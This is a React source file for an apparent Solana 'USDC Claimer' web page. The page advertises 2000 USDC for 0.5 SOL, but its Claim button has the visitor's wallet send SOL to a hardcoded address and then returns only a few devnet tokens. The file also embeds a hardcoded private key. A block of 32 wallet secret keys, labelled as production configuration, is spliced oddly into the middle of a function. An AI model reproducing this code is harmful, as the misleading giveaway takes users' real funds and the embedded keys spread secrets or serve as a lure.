/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3ufPoNFkizP2W97yHE6R2a3Rj8Ggg9viD8G8VbJfE8uUYYR63ux1gKcK9d7BnS8pPZtdrP1bDzm9fmhEnYZgEbBv"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "62qSLbfpQpTuT9jwJaVcbBJpVRW7MSJfrCmNGJeBcp6c26z6PV1nSN4hrboDH9KVrB4RcX9GppkRjHvfod2zL5KX",
  "key1": "3rvA5vTD3XQnxiGDMUKspVB83XWssXHnsHMBEKJpUDyntzJga2LBaZGRvLMMt2gaey2WYnYtASxMxTh43UKMSQeC",
  "key2": "5fMoVeymDKXsUwaLZsRsigqNYcfx5ZLer1X839Zt1rmNefasH1TXpLZVwrJReEpcBiSKSiDeeUeTQJumornEhxD3",
  "key3": "TPKFren6amYJFL3Se6vBkxQbLZ6vTT9m65dhJHY7HnPLRppPZ5Ewe3hkbho61Y3VtXrUCGzB8RsUWcgXE3GmM3K",
  "key4": "rAzG3ArFZeZBMkT7dtaECrfoj1Lxveoa9AreBABS2h4ZD5hPRx86fnHUp3QHNV17pnHvezcwi7dWH3ZXE5279xR",
  "key5": "2jUE6oDRij5L4CMq8E4rML617RSzwaZmdYVssCh1x51H1ZDhedaZJrZ84kT7V6AiJpGMW4VuW6RvfMD5hYsSfc2J",
  "key6": "cZfsfBdmwFhvT1KjcHU17EBXN7iu3MGVQXA2y896Je2vsdUnpKQyNBUkzBEcDyUxspDK9JvtYWuhqU3TuGXBryH",
  "key7": "5pFFcHRwMvD8dZrrgKN1MjAqTdsaroxTxjEKsfAW2EzW4b2g2zjsJmrYGFdgFe9qMgcTdMyYe7PRUXH8K6WKTmfw",
  "key8": "7xX6qx7ZvQwFtbWA6aXg4aH1xy45AXEtGFxwUPsAUGxF7SXaAY1cgNYUDSPgRy9NVwuXaT2GFtLsDtatjeVffqS",
  "key9": "3MTNd2nNVi4sBWVW4sBr28DxuPZWHQRL5RmyRVLna9z9YJyd7Gx11NYp2xuhDMTAUHE2p5D8wAp2edGwkRp3AWx4",
  "key10": "36Hirznmev2656Sn2DsQSKEfdKvbM6LJ7n82dJK7CWca6WoyyDKGUY1pFcSxgPNwt8dV1S1mRZT3hb9Vu3NknhDi",
  "key11": "yxJaxRDSqNuinwUYGPVZ71CrcDc5cT5g4hTNC7Q7mRUqYZUAQs4bX14DRLnQQ6w3WNsYANao5fqoZ2rpUnR7dZt",
  "key12": "3dx97UzRGG7LM8mB6iZCfmbPnWxJ6RUQEC56chU8HVbVUoftc83kHHqtiGFcWUT9H5xjQcB6Wxo79kbNzfW1QsaS",
  "key13": "3E59Jc6enAx169CSGpMShVyLXC9Q8wJoEnrZ8uUuQPR42EiFVd9VC7twnSHFgVzTDRiEZW1SZK1r9uPYyGMYsQXS",
  "key14": "2j6AwpCoCJXGJQ3F252K7H4BN5NjsKhHRNDhfJ87qayYgGRH2V7X4aSsvdbh4bEtvmy83nAaRg3GBujGKrLrHbXG",
  "key15": "66qqzGqZqVQ4ZeMkQVK8hoQYnhFsUJFVvpLEgapbceJKj1XJTuqRjuJem9W2MHV4cbea3wJYM3p1etpaH3UP4r7N",
  "key16": "2W4QdSKN6viU9ccybbxPeAAWf2PUk77wRTEvXUCHje8u8mQHmz8Z6jMRQVryaYA68XZAsuwPb9e7qtmHPSgQGrB4",
  "key17": "XrYUduQTKYmcDNRtyBBCvjjbPQRM5ypUGRJJrxHzKqU89r1JXfybuKRcURZpXeC75Vp6cwvA2oZX9V2vQ5ifxks",
  "key18": "5xUn26RBXxMtErW6ufkk2iA13x45Rru1rL1YdEUxpApMJ4JyoSzQqzk1dRFJ1TXjKzAafVzsjP3b4Gk2fjyHv2M8",
  "key19": "2u4rs1h5NamCHyvmTJsak2fNhAMD6AGCu45PgJEJbyLpZQ1fJk8yy8VtVsNcfURqkUWbDsGYfcBwafCyndcyZxRZ",
  "key20": "QbyMZgrnFSLZfsc1ZjoDgqoV42NdHU5MJYDCxZAC3JxgzPRJSwYCTk714PatKJssJ14zsEhmkmCzwWTTyww71Za",
  "key21": "4TpVd36dwLfK4m5RsMzc78eHJ5DbJR388p7ufXej96kbppMgShEsoSg4ZfvzYpj7CLjcv1PQo783oznYeJvcwKmF",
  "key22": "693bNYXTftDcPUnLJ3JpHaHbpztfnnnYkUGvmq7a9jDh8W43SZg69ck7RJVPCSuqtMVxtx3GvBQNux6DHsM2HBZ",
  "key23": "2iUdKHad6bT4PV6BnNG9iCHtTDpYRBrYVVHcwq1dydxFhb5EN2GxWKBSzxEaEDDtFUsRJupNnyGGM82UKK9saWcx",
  "key24": "5b1GQq8VLHj1LdH7xWyNzLqCvStK3qvZZW6cGL2fMFh9KoxrpXf1LSGABmerGmZSfWz9G7msfGMs5sXQLqv3oLNy",
  "key25": "odZV4Zt8nqfxcYMcuAu6bxiqFaUbhSed7djZGbMCGYVEed6bdE45DrnNJ6VBgwFcDWtXVmZAfoWi6wuJxXKbzQh",
  "key26": "3wX9p1vkZ3iE8dz3FGeYaBy6Yu6G2ocoURgm732gMgfxVaeTD5JnjTA3XXUEtofB4gSxkbhYoBvvtnpBvY2zzjQn",
  "key27": "51H1jPScHcdrhgj6eTpj6GruaViFKJugUPUdqc9EFpTW7prz8yPdtZAxQcfD1zsoUH81vpZuBJZonhDBFAdoEAzG",
  "key28": "5UbTkNnA8RkC46d8dfxSZGUG4FFgDN9dzgiiB42Pac7VJtBZKdR9x635aFKnMrAd2MPg9ER7EwxJEsPUdxuSk8Pc",
  "key29": "4ryVyqzhm83VCJzo8xZe9WUqnCxsVFASTAWjqP1jhjuLYVr1vQf4JeQQMt1Xxp8ZmWxrEznsZiUNozToeswUxb1G",
  "key30": "4n2KgWZHL1UtDTApaMvnapTrape7Zu38z3xkJCw8qXsoXowfzzQLUar3nZfDPN8VfdppBcM3C6mZCfNPCnewEcgm",
  "key31": "4Ax9DV9g4gFhfnEVtUrFFZAGfQyUeuWyhTxc1XmvpvDeoceMSkRoWiBFUcmM4AhW8NWLsRMiGvg9EKXit8f2twzG"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
